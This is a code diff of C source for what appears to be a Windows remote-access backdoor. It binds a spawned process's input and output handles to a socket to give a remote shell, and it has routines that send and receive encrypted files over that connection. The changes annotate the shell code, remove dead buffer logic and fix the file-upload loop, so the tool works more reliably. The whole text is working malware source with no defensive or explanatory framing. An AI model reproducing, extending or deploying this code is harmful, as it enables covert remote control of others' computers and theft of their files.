@@ -100,7 +100,7 @@ void CreateShell(int port) {
 
 		ini_processo.cb = sizeof(ini_processo);
 		ini_processo.dwFlags = (STARTF_USESTDHANDLES);
-		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)sockt;
+		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)sockt; //sets handles of process to the socket
 
 		CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info); //create shell
 		WaitForSingleObject(processo_info.hProcess, INFINITE); //wait for user to close shell on their end
@@ -177,26 +177,10 @@ void recieve() {
 
 	FILE* ptr = fopen(filename, "wb"); 
 
-	/*
-	//calculate leftover bytes to determine size of final buffer
-	int extra = (totalbytes % DEFAULT_BUFLEN); 
-	
-	char* tmpbuff = NULL; 
-	while (tmpbuff == NULL) //prevent tmpbuff being null
-		tmpbuff = malloc(extra * sizeof(char)); //makes tmpbuff size of remainder buff
-	*/
 	memset(buffer, 0, sizeof(buffer)); //clean buffer
 	printf("/n at while loop\n");
 	while (recvbytes < totalbytes) {
-		/*
-		if (totalbytes - recvbytes < DEFAULT_BUFLEN) {
-			recv(sockt, tmpbuff, extra, MSG_WAITALL);
-			decrypt(tmpbuff, extra, buffer);
-			fwrite(buffer, extra, 1, ptr);
-			free(tmpbuff);
-			break;
-		}
-		*/
+
 		printf("in while loop\n");
 		printf("%d / %d byes recieved\n", recvbytes, totalbytes);
 		RecvCode = recv(sockt, RecvData, DEFAULT_BUFLEN, 0);
@@ -262,13 +246,18 @@ void upload() {
 			while (bytesread < size) {
 
 				int rd = fread(ReadBuff, 1, MAX_READ, fp); //read 112 bytes from file
+				if (rd == 0) break;	 //means did not read full buffsize and thus EOF reached
+				memset(RecvData, '\0', DEFAULT_BUFLEN); //reset buffer
+
 
 				//encrypt read data into buffer for sending
 				val = encrypt(ReadBuff, rd, RecvData);
 
+				printf("val = %d", val);
+
 				send(sockt, RecvData, val, 0); //send bytes of size val
 
-				if (rd == 0) break; //means did not read full buffsize and thus EOF reached
+
 
 				bytesread += rd; //add amount sent to bytes total
 			}
